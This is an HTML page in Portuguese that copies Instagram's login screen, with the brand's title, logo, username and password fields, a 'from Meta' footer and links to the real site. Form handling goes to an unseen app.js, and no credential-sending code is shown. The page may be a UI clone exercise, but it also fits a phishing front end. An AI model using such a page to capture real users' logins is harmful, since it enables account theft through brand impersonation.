<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Instagram &bull; Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="styles.css">
</head>
<body>

  <div class="wrapper">
    <div class="box">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo">

      <form id="login-form">
        <div class="input-group">
          <input type="text" id="username" name="username" placeholder="Telefone, nome de usu&#225;rio ou email" autocomplete="username" autocapitalize="off" spellcheck="false" required>
        </div>

        <div class="input-group">
          <input type="password" id="password" name="password" placeholder="Senha" autocomplete="current-password" required>
          <button type="button" id="togglePassword" class="btn-show">Mostrar</button>
        </div>

        <button type="submit" id="btn" class="btn-login" disabled>
          <span class="btn-text">Entrar</span>
          <div class="spinner"></div>
        </button>
      </form>

      <div class="ou">OU</div>

      <a class="entrar-facebook" href="https://www.instagram.com/accounts/login/">
        <svg width="16" height="16" fill="#385185" viewBox="0 0 16 16">
          <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05S0 3.603 0 8.049C0 12.006 2.918 15.26 6.75 15.97v-5.61H4.72V8.05h2.03V6.276c0-2.017 1.196-3.13 3.022-3.13.875 0 1.79.156 1.79.156v1.98h-1.008c-.996 0-1.304.62-1.304 1.257v1.51h2.22l-.354 2.31H9.75v5.61c3.832-.71 6.75-3.963 6.75-7.92z"/>
        </svg>
        Entrar com o Facebook
      </a>

      <a class="esqueceu-senha" href="https://www.instagram.com/accounts/password/reset/">Esqueceu a senha?</a>
    </div>

    <div class="box-register">
      <p>N&#227;o tem uma conta? <a href="https://www.instagram.com/accounts/emailsignup/">Cadastre-se</a></p>
    </div>
  </div>

  <div class="rodape">
    <p>from Meta</p>
  </div>

  <script src="app.js"></script>
</body>
</html>
